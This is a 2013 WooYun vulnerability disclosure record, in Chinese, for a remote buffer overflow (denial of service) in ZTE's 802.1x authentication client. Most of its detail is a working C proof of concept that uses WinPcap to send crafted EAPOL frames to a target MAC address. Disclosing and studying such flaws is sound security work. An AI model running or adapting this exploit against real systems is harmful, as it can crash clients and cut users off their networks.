{"id": 12343, "wybug_id": "wooyun-2013-019880", "wybug_title": "ZTE中兴802.1x认证客户端远程缓冲区溢出漏洞", "wybug_corp": "中兴", "wybug_author": "cssembly", "wybug_date": "2013-03-11 11:07", "wybug_open_date": "2013-06-09 11:08", "wybug_type": "拒绝服务", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["拒绝服务", "客户端安全", "远程拒绝服务"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-03-11：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-06-09：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： ZTE中兴802.1x认证客户端在接受数据时，未做有效性检验，导致缓冲区溢出，产生拒绝服务漏洞 详细说明：  \n\npdata指向接受到的数据，data_len为数据长度，当数据长度为17时，传给sub_40EFD0的第三个参数为0xFFFFFFFF构造其余数据，在sub_40E340处触发漏洞\n\n   漏洞证明：  poc代码如下：\n#include <pcap.h>#pragma comment( lib , \"wpcap.lib\" )int _tmain(int argc, _TCHAR* argv[]){\tpcap_t *fp;\tchar errbuf[PCAP_ERRBUF_SIZE];\tu_char packet[3000];\tpcap_if_t *alldevs;\t/* Check the validity of the command line */\tif(pcap_findalldevs(&alldevs, errbuf) == -1)\t{\t\tfprintf(stderr,\"Error in pcap_findalldevs: %s\\n\", errbuf);\t\texit(1);\t}\tpcap_if_t *d;\tint i = 0;\t/* Print the list */\tfor(d=alldevs; d; d=d->next)\t{\t\tprintf(\"%d. %s\", ++i, d->name);\t\tif (d->description)\t\t\tprintf(\" (%s)\\n\", d->description);\t\telse\t\t\tprintf(\" (No description available)\\n\");\t}\t/* 选择相应网卡*/\tif ((fp = pcap_open_live(alldevs->name,\t\t// name of the device\t\t65536,\t\t\t// portion of the packet to capture. It doesn't matter in this case \t\t1,\t\t\t\t// promiscuous mode (nonzero means promiscuous)\t\t1000,\t\t\t// read timeout\t\terrbuf\t\t\t// error buffer\t\t)) == NULL)\t{\t\tfprintf(stderr,\"\\nUnable to open the adapter. %s is not supported by WinPcap\\n\", argv[1]);\t\treturn 2;\t}\tmemset( packet , 0 , 1000 );\t\t/* 目标机器mac地址 */\tpacket[0]= 0x00;\tpacket[1]= 0x0C;\tpacket[2]= 0x29;\tpacket[3]= 0x0F;\tpacket[4]= 0x63;\tpacket[5]= 0xDD;\t/* set mac source to 2:2:2:2:2:2 */\tpacket[6]= 2;\tpacket[7]= 2;\tpacket[8]= 2;\tpacket[9]= 2;\tpacket[10]= 2;\tpacket[11]= 2;\t/* 协议头 */\tpacket[12] = 0x88;\tpacket[13] = 0x8e;\tpacket[14] = 0x01;\tpacket[15] = 0x00;\tpacket[0x12] = 0x01;//此处必须为0x0A\tpacket[22] = 0x04;\tpacket[23] = 0x10;\t\t/* Send down the packet */\tif (pcap_sendpacket(fp,\t// Adapter\t\tpacket,\t\t\t\t// buffer with the packet\t\t100\t// size\t\t) != 0)\t{\t\tfprintf(stderr,\"\\nError sending the packet: %s\\n\", pcap_geterr(fp));\t\treturn 3;\t}\tSleep( 100 );\tif (pcap_sendpacket(fp,\t// Adapter\t\tpacket,\t\t\t\t// buffer with the packet\t\t17\t\t\t\t\t// size\t\t) != 0)\t{\t\tfprintf(stderr,\"\\nError sending the packet: %s\\n\", pcap_geterr(fp));\t\treturn 3;\t}\tpcap_close(fp);\t\treturn 0;\treturn 0;}\n打开程序\n\n点击连接，程序开始接受数据包\n\n运行poc代码，此处需要保证第二个数据包的长度为17字节\n\n   修复方案：     版权声明：转载请注明来源 cssembly@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}